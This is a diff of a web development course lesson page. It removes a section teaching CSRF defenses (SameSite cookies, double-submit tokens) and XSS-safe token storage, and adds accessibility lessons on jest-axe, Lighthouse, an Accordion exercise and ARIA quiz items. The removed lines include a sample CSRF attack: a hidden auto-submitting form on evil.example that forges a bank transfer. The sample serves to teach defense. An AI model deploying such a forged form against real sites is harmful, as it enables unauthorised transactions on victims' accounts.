-                <p>If the content is a plain string, JSX already protects you — just render it normally. If it must be rendered as HTML, it must pass through a sanitizer immediately before <code>dangerouslySetInnerHTML</code>, with no exceptions for "trusted" sources — a compromised admin account or a hacked CMS is still user-supplied content from your app's perspective.</p>
-              </div>
-            </div>
-          </section>
-
-          <section id="csrf-secure-api">
-            <h2>5. CSRF &amp; Secure API Calls</h2>
-            <p>
-              Cross-site request forgery (CSRF) targets cookie-based auth specifically — it doesn't
-              touch JWT-in-an-<code>Authorization</code>-header setups at all, because that pattern
-              requires JavaScript on your own origin to attach the token, and a malicious site can't
-              read or set headers on requests to your API. A cookie, on the other hand, is
-              attached by the browser <strong>automatically</strong>, to requests from any site —
-              which is exactly the mechanism CSRF abuses.
-            </p>
-
-            <p>
-              The attack: a user is logged into <code>bank.example</code> (session cookie set). They
-              then visit <code>evil.example</code>, which contains a hidden form auto-submitting a
-              POST to <code>bank.example/api/transfer</code>. The browser dutifully attaches the
-              <code>bank.example</code> session cookie to that request — because it doesn't know or
-              care which site's HTML triggered it — and the transfer executes as if the real user
-              requested it, because as far as the server can tell, they did.
-            </p>
-
-            <div class="code-block">
-              <div class="code-block__label">the attack -- hosted on a completely different site</div>
-              <pre><code>&lt;!-- evil.example --&gt;
-&lt;form action="https://bank.example/api/transfer" method="POST" id="f"&gt;
-  &lt;input type="hidden" name="to" value="attacker-account" /&gt;
-  &lt;input type="hidden" name="amount" value="5000" /&gt;
-&lt;/form&gt;
-&lt;script&gt;document.getElementById('f').submit();&lt;/script&gt;
-&lt;!-- the browser attaches bank.example's session cookie automatically -- no consent needed --&gt;
-</code></pre>
-            </div>
-
-            <p>
-              The <strong><code>SameSite</code></strong> cookie attribute is the first line of
-              defense, and it's the one already set in Section 2's login example.
-              <code>SameSite=Strict</code> tells the browser to never send that cookie on a
-              cross-site request, period — the evil.example form above would submit with no
-              session cookie attached at all, and the server would see an unauthenticated request.
-              <code>SameSite=Lax</code> (the modern browser default) is slightly more permissive —
-              it still sends the cookie for top-level navigations (clicking a real link) but blocks
-              it on cross-site POSTs like the form above, which covers the CSRF case while not
-              breaking normal cross-site linking.
-            </p>
-
-            <div class="code-block">
-              <div class="code-block__label">the strongest setting, when your frontend and API share a site</div>
-              <pre><code>res.cookie('authToken', token, {
-  httpOnly: true,
-  secure: true,
-  sameSite: 'strict', // never sent on any cross-site request, forged or not
+it('has no accessibility violations', async () =&gt; {
+  const { container } = render(&lt;ProductCard product={mockProduct} /&gt;);
+  const results = await axe(container);
+  expect(results).toHaveNoViolations();
 });
 </code></pre>
             </div>
 
             <p>
-              For extra defense-in-depth (or when <code>SameSite=Strict</code> is too restrictive
-              for a legitimate flow), the <strong>double-submit CSRF token</strong> pattern adds a
-              second, independent check: the server sends a random token the page can read, the
-              client echoes it back in a custom header on every mutation, and the server confirms the
-              header matches — something a cross-site form, which can't read your page's JavaScript
-              or cookies, has no way to forge.
+              Wiring this into your Week 14 test suite means an accessibility regression — a
+              missing label, a contrast issue introduced by a design change — fails CI the same way
+              a broken feature test would, instead of only being caught by someone manually running
+              a browser extension. <strong>Lighthouse</strong> (built into Chrome DevTools) covers
+              similar ground at the whole-page level, plus performance and SEO, and is worth a
+              manual pass on every major page even without wiring it into automated tests.
             </p>
-
-            <div class="code-block">
-              <div class="code-block__label">client -- read the CSRF token from a non-httpOnly cookie, echo it back on mutations</div>
-              <pre><code>function getCsrfToken(): string | undefined {
-  return document.cookie
-    .split('; ')
-    .find(row =&gt; row.startsWith('csrf_token='))
-    ?.split('=')[1];
-}
-
-async function transferFunds(to: string, amount: number) {
-  return fetch('/api/transfer', {
-    method: 'POST',
-    credentials: 'include',
-    headers: {
-      'Content-Type': 'application/json',
-      'X-CSRF-Token': getCsrfToken() ?? '', // a forged cross-site request can't set this
-    },
-    body: JSON.stringify({ to, amount }),
-  });
-}
-</code></pre>
-            </div>
-
-            <div class="callout callout--tip">
-              <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a7 7 0 0 0-4 12.7V17a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2v-2.3A7 7 0 0 0 12 2Z"/><path d="M9 21h6"/></svg>
-              <div>
-                <strong>Why the CSRF token cookie isn't httpOnly</strong>
-                <p>The double-submit pattern relies on your own page's JavaScript being able to read the token and echo it in a header — that's the entire proof that the request originated from your site, since a cross-origin attacker's script can't read cookies set for your domain. The <em>auth</em> cookie stays httpOnly; the CSRF token cookie is a separate, deliberately-readable value with no sensitive data in it.</p>
-              </div>
-            </div>
           </section>
 
           <section id="exercise">
@@ -621,23 +425,23 @@ async function transferFunds(to: string, amount: number) {
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M13 2 3 14h7l-1 8 11-14h-7l1-6Z"/></svg>
                 Hands-on
               </span>
-              <h3>Build a real RequireAuth/RequireRole pair, an httpOnly login flow, and a sanitized comment</h3>
-              <p>Turn this week's three security concerns into working code inside one small app.</p>
+              <h3>Style and audit Week 12's Accordion for real accessibility</h3>
+              <p>Apply Tailwind and this week's accessibility checklist to a component you've already built.</p>
 
               <p><strong>Requirements:</strong></p>
               <ol>
-                <li>Write a <code>RequireAuth</code> route wrapper (as in Week 7) plus a <code>RequireRole({'role'})</code> wrapper that accepts a role and redirects to <code>/forbidden</code> when the current user's role doesn't match — wire both into a route tree so <code>/admin</code> requires <em>both</em> being logged in and being an admin.</li>
-                <li>Write a <code>login()</code> function that POSTs credentials to <code>/api/login</code> with <code>credentials: 'include'</code> and never reads or stores a token in JS. If you don't have a real backend available, write the Express-style handler from Section 2 in a comment above your client code to show exactly what it would set.</li>
-                <li>Add a fake current-user hook (<code>useAuth</code>) backed by an <code>/api/me</code> call that relies purely on the cookie being attached automatically — no token passed manually anywhere in your client code.</li>
-                <li>Install DOMPurify and render one piece of "user-generated" rich-text content (hardcode a string containing a <code>&lt;script&gt;</code> tag to prove it gets stripped) through a sanitized <code>dangerouslySetInnerHTML</code>, using an allowlist of tags.</li>
-                <li>Add a comment documenting which <code>SameSite</code> value your login cookie uses and why you chose it over the alternative.</li>
+                <li>Restyle Week 12's <code>Accordion</code> compound component using Tailwind utility classes, including a visible focus ring on the header buttons (<code>focus-visible:ring-2</code> or similar) — never remove the default focus outline without replacing it with something equally visible.</li>
+                <li>Add correct keyboard support to the accordion headers: Enter/Space toggles the panel (a real <code>&lt;button&gt;</code> gets this for free per Section 3), and confirm you can operate the entire component using only the Tab and Enter keys, mouse unplugged.</li>
+                <li>Confirm each header has <code>aria-expanded</code> reflecting its panel's open state, and that each panel is properly associated with its header via <code>aria-controls</code>/<code>id</code>.</li>
+                <li>Install <code>jest-axe</code>, write an accessibility test for the Accordion following Section 5, and fix any violations it reports.</li>
+                <li>Run a Lighthouse accessibility audit on the page in Chrome DevTools and address anything it flags.</li>
               </ol>
 
               <div class="callout callout--tip">
                 <svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M12 2a7 7 0 0 0-4 12.7V17a2 2 0 0 0 2 2h4a2 2 0 0 0 2-2v-2.3A7 7 0 0 0 12 2Z"/><path d="M9 21h6"/></svg>
                 <div>
                   <strong>Hint</strong>
-                  <p>To confirm your token really isn't reachable from JS, open your browser's dev console on the running app and try <code>document.cookie</code> — an httpOnly cookie simply won't appear in that string, which is the whole point.</p>
+                  <p>Try the whole exercise once with your mouse physically unplugged (or DevTools' focus emulation) — many keyboard gaps are invisible until you actually try to navigate without a mouse yourself, rather than just reading the ARIA attributes and assuming they're sufficient.</p>
                 </div>
               </div>
             </div>
@@ -652,13 +456,13 @@ async function transferFunds(to: string, amount: number) {
                 <summary>
                   <span class="week-item__badge">Q1</span>
                   <div class="week-item__heading">
-                    <h4>What's the core tradeoff between a server session (cookie + server-side store) and a JWT?</h4>
+                    <h4>Why does using a real <code>&lt;button&gt;</code> instead of a <code>&lt;div onClick&gt;</code> save you work, not just markup purity?</h4>
                   </div>
                   <span class="week-item__chevron"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg></span>
                 </summary>
                 <div class="week-item__body week-item__body--single">
                   <div class="week-item__col">
-                    <p>A server session keeps state on the server, which makes revocation instant (delete the session row) but requires that state to be reachable by every server instance handling requests. A JWT is self-contained and stateless — any server holding the signing secret can verify it without a lookup, which scales easily, but there's no way to revoke a single token before it expires without adding extra machinery like a denylist.</p>
+                    <p>A native <code>&lt;button&gt;</code> comes with keyboard focusability, Enter/Space activation, and correct screen-reader announcement built into the browser for free. A <code>&lt;div onClick&gt;</code> has none of that — achieving equivalent behavior requires manually adding <code>tabIndex</code>, a <code>role</code>, and keyboard event handlers, reimplementing what semantic HTML already provides.</p>
                   </div>
                 </div>
               </details>
@@ -667,13 +471,13 @@ async function transferFunds(to: string, amount: number) {
                 <summary>
                   <span class="week-item__badge">Q2</span>
                   <div class="week-item__heading">
-                    <h4>Why is storing an auth token in <code>localStorage</code> usually the wrong choice?</h4>
+                    <h4>Does adding <code>role="tab"</code> to an element automatically give it tab-like keyboard behavior?</h4>
                   </div>
                   <span class="week-item__chevron"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg></span>
                 </summary>
                 <div class="week-item__body week-item__body--single">
                   <div class="week-item__col">
-                    <p><code>localStorage</code> is fully readable by any JavaScript running on the page. If the app has even one XSS vulnerability — one unsanitized render, one compromised dependency — an attacker's injected script can read the token directly with <code>localStorage.getItem(...)</code> and send it to their own server, no cookie theft or network interception required. An httpOnly cookie removes this risk because JavaScript can't read it at all.</p>
+                    <p>No. An ARIA role changes how the element is announced to assistive technology, but grants none of the associated interaction behavior automatically — arrow-key navigation, focus management, and activation all still need to be implemented by hand, which is exactly why Section 4's <code>Tab</code> component has explicit <code>onKeyDown</code> logic alongside its <code>role</code>.</p>
                   </div>
                 </div>
               </details>
@@ -682,13 +486,13 @@ async function transferFunds(to: string, amount: number) {
                 <summary>
                   <span class="week-item__badge">Q3</span>
                   <div class="week-item__heading">
-                    <h4>When is <code>dangerouslySetInnerHTML</code> actually necessary, and how do you use it safely?</h4>
+                    <h4>What kind of accessibility issue can an automated tool like axe or Lighthouse reliably catch, and what can't it judge?</h4>
                   </div>
                   <span class="week-item__chevron"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg></span>
                 </summary>
                 <div class="week-item__body week-item__body--single">
                   <div class="week-item__col">
-                    <p>It's needed when content is legitimately meant to render as HTML rather than plain text — rich-text editor output, a CMS field, converted Markdown — cases where JSX's default text-escaping would be wrong, not just inconvenient. It's safe only when the HTML string is passed through a sanitizer like DOMPurify (with an explicit tag/attribute allowlist) immediately before rendering, every time, regardless of how "trusted" the source seems.</p>
+                    <p>It reliably catches concrete, structural issues: missing labels, insufficient color contrast, missing alt text, invalid ARIA attribute usage. It can't judge subjective or contextual quality — whether alt text is genuinely descriptive of an image's content, or whether a keyboard flow through a page feels sensible to actually use — those still require a human accessibility review.</p>
                   </div>
                 </div>
               </details>
@@ -697,13 +501,13 @@ async function transferFunds(to: string, amount: number) {
                 <summary>
                   <span class="week-item__badge">Q4</span>
                   <div class="week-item__heading">
-                    <h4>How does a <code>SameSite=Strict</code> cookie mitigate CSRF?</h4>
+                    <h4>In the keyboard-accessible <code>Tab</code> component, why is <code>tabIndex</code> set to <code>0</code> for the active tab and <code>-1</code> for the others?</h4>
                   </div>
                   <span class="week-item__chevron"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5" stroke-linecap="round" stroke-linejoin="round"><path d="m6 9 6 6 6-6"/></svg></span>
                 </summary>
                 <div class="week-item__body week-item__body--single">
                   <div class="week-item__col">
-                    <p>CSRF relies on the browser automatically attaching a session cookie to a request triggered by a form or script hosted on a completely different, malicious site. <code>SameSite=Strict</code> tells the browser to never send that cookie on any cross-site request, so the forged request arrives at the server with no session cookie attached at all — indistinguishable from an unauthenticated request, and rejected accordingly.</p>
+                    <p>This follows the documented ARIA tabs pattern: only the active tab should sit in the page's normal Tab-key order, so pressing Tab moves focus <em>past</em> the whole tab group in one step, while the arrow keys handle moving focus <em>between</em> the individual tabs once you're inside the group. Giving every tab <code>tabIndex={'{0}'}</code> would force a keyboard user to Tab through every single tab individually just to get past the group.</p>
                   </div>
                 </div>
               </details>
@@ -715,11 +519,11 @@ async function transferFunds(to: string, amount: number) {
         <div class="lesson-pager">
           <a href="week-22.html" class="lesson-pager__link lesson-pager__link--prev">
             <span class="lesson-pager__label">← Back to</span>
-            <span class="lesson-pager__title">Week 22: Animations &amp; Internationalization</span>
+            <span class="lesson-pager__title">Week 22: Deployment, CI/CD &amp; Production Ops</span>
           </a>
           <a href="week-24.html" class="lesson-pager__link lesson-pager__link--next">
             <span class="lesson-pager__label">Up next</span>
-            <span class="lesson-pager__title">Week 24: Micro-Frontends &amp; Advanced Architecture →</span>
+            <span class="lesson-pager__title">Week 24: Animations &amp; Internationalization →</span>
           </a>
         </div>
       </div>
@@ -745,6 +549,7 @@ async function transferFunds(to: string, amount: number) {
       <a href="../system-design/index.html">System Design</a>
       <a href="../node-express/index.html">Node.js &amp; Express</a>
       <a href="../servicenow/index.html">ServiceNow</a>
+      <a href="../aptitude/index.html">Numerical Aptitude</a>
       <a href="#top">Back to top</a>
     </nav>
     <small>© 2026 CodeVerse Creatives. All rights reserved.</small>
